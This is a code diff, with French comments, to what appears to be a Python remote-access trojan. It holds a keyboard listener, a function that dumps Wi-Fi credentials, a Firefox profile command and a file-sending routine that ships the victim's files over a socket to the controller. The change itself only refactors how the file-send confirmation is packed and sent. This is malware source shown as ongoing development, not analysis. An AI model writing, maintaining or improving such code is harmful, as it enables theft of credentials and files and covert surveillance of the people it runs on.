@@ -4,6 +4,7 @@ import time
 import subprocess
 import os
 import sys
+import struct
 import paramiko
 from pynput import keyboard
 import threading
@@ -107,7 +108,6 @@ def dump_wifi_credentials(output_file="wifi_credentials.txt"):
 
 # COMMANDE : download
 def send_files(file_list, sock):
-    import struct
     for filepath in file_list:
         if not os.path.exists(filepath):
             msg = f"__ERROR__: {filepath} not found"
@@ -134,6 +134,10 @@ def send_files(file_list, sock):
             msg = f"__ERROR__: Failed to send {filepath}: {e}"
             sock.send(struct.pack("!I", len(msg)))
             sock.send(msg.encode())
+
+    confirmation = "[✓] Fichiers envoyés"
+    sock.send(struct.pack("!I", len(confirmation)))
+    sock.send(confirmation.encode())
 
 
 
@@ -288,7 +292,7 @@ def handle_command(cmd):
     elif cmd.startswith("download "):
         files = cmd.split(" ", 1)[1].split(";")
         send_files(files, client_socket)
-        return "[✓] Fichiers envoyés"
+        return None
     elif cmd == "wifi":
         return dump_wifi_credentials()
     elif cmd == "firefox_profiles":
